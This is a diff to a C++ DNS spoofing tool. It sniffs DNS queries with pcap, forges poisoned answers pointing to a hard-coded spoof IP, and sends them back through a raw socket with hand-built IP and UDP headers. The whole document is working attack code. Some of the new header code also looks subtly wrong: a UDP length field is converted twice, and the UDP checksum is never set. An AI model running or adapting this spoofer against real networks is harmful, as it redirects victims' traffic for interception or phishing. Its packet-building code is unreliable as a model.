@@ -9,6 +9,7 @@
 #include "NetworkEngine.h"
 #include "UdpStack.h"
 
+#include "checksum.h"
 #include "dns.h"
 
 void dnsSpoof(NetworkEngine *net);
@@ -170,7 +171,7 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     struct in_addr spoofIp;
     spoofIp.s_addr = 0x1300a8c0;
 
-    UCharVector buffer(1500, 0);
+    unsigned char buffer[1500];
     struct iphdr *ip;
     struct udphdr *udp;
     dnshdr *dns;
@@ -190,30 +191,51 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     std::cout << "dns packet received" << std::endl;
 
     // craft the poisoned response
-    int responseSize = forgeDns(dns, &spoofIp, buffer.data());
-    buffer.resize(responseSize);
+    int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
 
     struct in_addr originalSrc;
     struct in_addr originalDst;
-
     originalSrc.s_addr = ip->saddr;
     originalDst.s_addr = ip->daddr;
 
-    std::cout << "craft a response with size: " << buffer.size() << std::endl;
+    std::cout << "craft a response with size: " << responseSize << std::endl;
 
     // reply
     int rawSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
+    struct iphdr *ipBuffer = (struct iphdr *)buffer;
+    struct udphdr *udpBuffer = (struct udphdr *)(buffer + 20);
+
+    ipBuffer->ihl = 5;
+    ipBuffer->version = 4;
+    ipBuffer->tos = 0;
+    ipBuffer->id = (int)(244.0 * rand() / (RAND_MAX + 1.0));
+    ipBuffer->frag_off = 0;
+    ipBuffer->ttl = 64;
+    ipBuffer->protocol = IPPROTO_UDP;
+    ipBuffer->check = 0;
+    ipBuffer->saddr = ip->daddr;
+    ipBuffer->daddr = ip->saddr;
+    ipBuffer->check = in_cksum((unsigned short *)ipBuffer, 20);
+    udpBuffer->source = udp->dest;
+    udpBuffer->dest = udp->source;
+    udpBuffer->len = htons(8 + responseSize);
+    struct UdpPseudoHeader pseudo_header;
+    pseudo_header.srcAddr = ipBuffer->saddr;
+    pseudo_header.dstAddr = ipBuffer->daddr;
+    pseudo_header.placeholder = 0;
+    pseudo_header.protocol = IPPROTO_UDP;
+    pseudo_header.udpLen = htons(udpBuffer->len);
+    memcpy((char *)&pseudo_header.udp, (char *)udpBuffer, 8 + responseSize);
+    short totalLen = 20 + 8 + responseSize;
+    ipBuffer->tot_len = htons(totalLen);
+
     struct sockaddr_in sin;
-
-    UdpStack udpStack(originalDst, originalSrc, ntohs(udp->dest), ntohs(udp->source), buffer);
-    UCharVector frame = udpStack.getPacket();
-
     sin.sin_family = AF_INET;
-    sin.sin_port = udpStack.udp.source;
-    sin.sin_addr.s_addr = udpStack.ip.daddr;
+    sin.sin_port = udpBuffer->source;;
+    sin.sin_addr.s_addr = ipBuffer->daddr;
 
-    sendto(rawSocket, frame.data(), frame.size(), 0, (struct sockaddr *)&sin, sizeof(sin));
+    sendto(rawSocket, buffer, totalLen, 0, (struct sockaddr *)&sin, sizeof(sin));
     std::cout << "sending reply" << std::endl;
 
     close(rawSocket);
